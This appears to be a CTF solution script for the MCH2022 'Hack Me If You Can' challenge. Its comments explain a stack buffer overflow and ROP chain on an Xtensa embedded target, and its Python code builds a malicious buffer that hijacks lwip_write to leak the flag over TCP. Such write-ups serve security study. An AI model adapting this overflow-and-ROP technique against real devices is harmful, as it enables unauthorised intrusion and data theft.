#!/bin/python

# Steps to exploitation:
# 1. Observe behaviour
#   - Experiment with inputs.
#   - Observe output via TCP and debug console.
#   - Identify likely buffer overflow at inputs >48 bytes.
# 2. Analyze binary
#   - Use Ghidra with an open source [Xtensa module]
#     (https://github.com/yath/ghidra-xtensa) for disassembly.
#   - Determine that flag is read from non-volatile storage and copied to a
#     fixed address.
# 3. Map execution flow
#   - Observe that certain buffer sizes >48 bytes will trigger a `gdbstub`
#     register dump to the debug console due to a corrupted return address.
#   - Use the register dump to follow execution flow in Ghidra. Determine
#     that the callee at the time our corrupted return address gets loaded
#     is the innermost call to `do_echo_recursive()`. The caller is the second
#     innermost call.
#   - Identify the offsets needed to set the return address (`a0`) and stack
#     pointer (`a1`) of the callee's register window, and the registers `a10`
#     and `a11` of the caller's register window.
# 4. Identify ROP gadget
#   - Use Ghidra to identify a `call8` instruction to 
#     `lwip_write(int socket, void* data, size_t size)`. We can use this
#     function to send data back to our client. Note we can do this without
#     any setup because a TCP connection already exists at the time we hijack
#     the execution flow.
# 5. Determine ROP gadget arguments
#   - Use the register dump to observe that the socket descriptor (register a2
#     in the caller's register window) is always the same (`0x37`) and likely
#     deterministic. Set a10 (`socket` argument) to `0x37`.
#   - Set a11 (`*data` argument) to the flag location we found earlier.
#   - Observe that register a12 (`size` argument) is reliably set to a large
#     value and does not need to be modified.
# 6. Create malicious buffer and run exploit

import socket
import argparse

def main():
    parser = argparse.ArgumentParser(
            description="Exploit for the 'Hack Me If You "
                        "Can' challenge for the MCH2022 CTF."
    )
    parser.add_argument('target', type=str, help='target IP / hostname')
    parser.add_argument('port', type=int, help='target port')
    args = parser.parse_args()

    # Exploit constants
    A10 = b"\x37\x00\x00\x00" # socket descriptor (first argument)
    A11 = b"\x58\x53\xfb\x3f" # flag address (second argument)
    PC  = b"\xb8\x76\x0d\x40" # call8 lwip_write(a10, a11, a12)
    A1  = b"\xb0\xf1\xfb\x3f" # stack pointer (req'd to return from do_echo())

    exploit(args.target, args.port, A10, A11, PC, A1)

def exploit(target, port, a10, a11, pc, a1):
    buffer = b"\x65" * 40 + a10 + a11 + pc + a1 + b"\n"

    print(f"Connecting to {target}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))

    print(f"Waiting for user to accept connection...")
    r = s.recv(128)
    status = r.decode()
    print(status)

    if "denied" in status:
        s.close()
        return

    print(f"Sending malicious buffer...")
    s.sendall(buffer)

    print(f"Buffer sent, awaiting reply...")

    # Discard output of do_echo() 
    s.recv(len(buffer))

    r = s.recv(39)
    s.close()

    print(f"Flag: {r.decode()}")

if __name__ == "__main__":
    main()

